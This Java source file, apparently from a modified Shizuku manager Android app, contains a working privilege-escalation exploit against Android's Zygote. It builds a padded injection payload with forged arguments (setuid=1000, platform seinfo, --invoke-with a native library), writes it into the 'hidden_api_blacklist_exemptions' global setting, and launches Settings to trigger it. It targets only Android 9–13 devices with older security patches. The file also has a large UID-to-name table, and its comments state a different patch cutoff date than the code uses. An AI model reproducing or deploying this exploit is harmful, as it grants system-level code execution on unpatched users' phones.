package moe.shizuku.manager.patch;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.os.Build;
import android.provider.Settings;
import java.time.LocalDate;
import java.time.format.DateTimeFormatter;
import java.time.format.DateTimeParseException;

public class Util {
	final static String basePoc;//"\n\n\n\n\n11\n--setuid=1000\n--setgid=9997\n--setgroups=3003\n--runtime-args\n--mount-external-full\n--mount-external-legacy\n--seinfo=platform:privapp:targetSdkVersion=30:complete\n--runtime-flags=43267\n--nice-name=zYg0te2\n--invoke-with\n%s; #,,,,X";

	static {
		String n = "\n";
		int count = 0;
		StringBuffer poc = new StringBuffer();
		if (Build.VERSION.SDK_INT <= 30) {
			count = 5;
			poc.append(n.repeat(count) + 11 + n);
		} else if (Build.VERSION.SDK_INT <= 33) {
			count = 5001;
			poc.append(n.repeat(count) + "A".repeat(3157) + 11);
		}


		poc.append("--setuid=1000" + n)
			.append("--setgid=9997" + n)
			.append("--setgroups=3003" + n)
			.append("--runtime-args" + n)
			.append("--mount-external-full" + n)
			.append("--mount-external-legacy" + n)
			.append("--seinfo=platform:privapp:targetSdkVersion=30:complete" + n)
			.append("--runtime-flags=43267" + n)
			.append("--nice-name=zYg0te2" + n)
			.append("--invoke-with" + n)
			.append("%s; #")
			.append(",".repeat(count -1))
			.append("X");
		basePoc = poc.toString();
	}

    public static String getNameByUid(int uid) {
		switch (uid) {
			case 0: return "root(0)";
			case 1: return "daemon(1)";
			case 2: return "bin(2)";
			case 1000: return "system(1000)";
			case 1001: return "radio(1001)";
			case 1002: return "graphics(1002)";
			case 1003: return "input(1003)";
			case 1004: return "audio(1004)";
			case 1005: return "camera(1005)";
			case 1006: return "log(1006)";
			case 1007: return "compass(1007)";
			case 1008: return "mount(1008)";
			case 1009: return "wifi(1009)";
			case 1010: return "adb(1010)";
			case 1011: return "install(1011)";
			case 1012: return "media(1012)";
			case 1013: return "dhcp(1013)";
			case 1014: return "sdcard_rw(1014)";
			case 1015: return "vpn(1015)";
			case 1016: return "keystore(1016)";
			case 1017: return "usb(1017)";
			case 1018: return "drm(1018)";
			case 1019: return "mdnsr(1019)";
			case 1020: return "gps(1020)";
			case 1021: return "unused1(1021)";
			case 1022: return "media_rw(1022)";
			case 1023: return "mtp(1023)";
			case 1024: return "nfc(1024)";
			case 1025: return "drmrpc(1025)";
			case 1026: return "epm_rtc(1026)";
			case 1027: return "lock_settings(1027)";
			case 1028: return "credentials(1028)";
			case 1029: return "audioserver(1029)";
			case 1030: return "metrics_collector(1030)";
			case 1031: return "metricsd(1031)";
			case 1032: return "webservd(1032)";
			case 1033: return "debuggerd(1033)";
			case 1034: return "mediadrm(1034)";
			case 1035: return "diskread(1035)";
			case 1036: return "net_bt_admin(1036)";
			case 1037: return "nfc(1037)";
			case 1038: return "sensor(1038)";
			case 1039: return "mediadrm(1039)";
			case 1040: return "camerad(1040)";
			case 1041: return "print(1041)";
			case 1042: return "tether(1042)";
			case 1043: return "trustedui(1043)";
			case 1044: return "rild(1044)";
			case 1045: return "configstore(1045)";
			case 1046: return "wificond(1046)";
			case 1047: return "paccm(1047)";
			case 1048: return "ipacm(1048)";
			case 1049: return "neuralnetworks(1049)";
			case 1050: return "credstore(1050)";
			case 2000: return "shell(2000)";
		}
		return "unknown(" + uid + ")";
	}

	public static StringBuffer startSysShizuku(Context context) throws PackageManager.NameNotFoundException, InterruptedException {
		if (context == null) {
			throw new RuntimeException("Context is null!!");
		}

		StringBuffer sb = new StringBuffer();
		String packageName = context.getApplicationContext().getPackageName();

		if (context.checkSelfPermission("android.permission.WRITE_SECURE_SETTINGS") != PackageManager.PERMISSION_GRANTED) {
			sb.append("No android.permission.WRITE_SECURE_SETTINGS permission : (\n");
			sb.append(String.format("Use pm grant %s android.permission.WRITE_SECURE_SETTINGS to grant it", packageName));
			return sb;
		}
		// 获取 PackageManager 实例
		PackageManager packageManager = context.getApplicationContext().getPackageManager();
		// 获取应用的 ApplicationInfo 对象
		ApplicationInfo applicationInfo = packageManager.getApplicationInfo(packageName, 0);
		// 获取 lib 库的路径
		String nativeLibraryDir = applicationInfo.nativeLibraryDir;
		String epath = nativeLibraryDir + "/libshizuku.so";
		String pocString = String.format(basePoc, epath);

		sb.append("use poc\n");
		sb.append(pocString);

		Settings.Global.putString(context.getContentResolver(), "hidden_api_blacklist_exemptions", pocString);

		startSetting(context);

		Thread.sleep(200);

		Settings.Global.putString(context.getContentResolver(), "hidden_api_blacklist_exemptions", "");

		sb.append("\nSuccess");
		return sb;
	}

	private static void startSetting(Context context) {
		String packageName = "com.android.settings"; // 替换为目标应用包名
		PackageManager packageManager = context.getPackageManager();
		Intent intent = packageManager.getLaunchIntentForPackage(packageName);

		if (intent != null) {
			context.startActivity(intent);
		}
	}

	public static void register() {

	}

	public static boolean canUsePoc() {
		return Build.VERSION.SDK_INT >= 28 && Build.VERSION.SDK_INT <= 33 && !isSecurityPatchUpToDate(); 
	}

	public static String getSecurityPatchLevel() {
        return Build.VERSION.SECURITY_PATCH; // 返回类似 "2024-05-01"
    }

    /**
     * 判断安全补丁是否过期（以 2023-12-01 为安全底线）
     * @return true 表示安全，false 表示存在风险
     */
    public static boolean isSecurityPatchUpToDate() {
        String patchStr = getSecurityPatchLevel();
        if (patchStr == null || patchStr.isEmpty()) {
            return false; // 无法获取，视为不安全
        }

        try {
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd");
            LocalDate patchDate = LocalDate.parse(patchStr, formatter);
            LocalDate cutoffDate = LocalDate.of(2024, 6, 1); // 安全底线

            return !patchDate.isBefore(cutoffDate); // 补丁 >= 2023-12-01 则安全
        } catch (DateTimeParseException e) {
            return false; // 格式错误，视为不安全
        }
    }
}

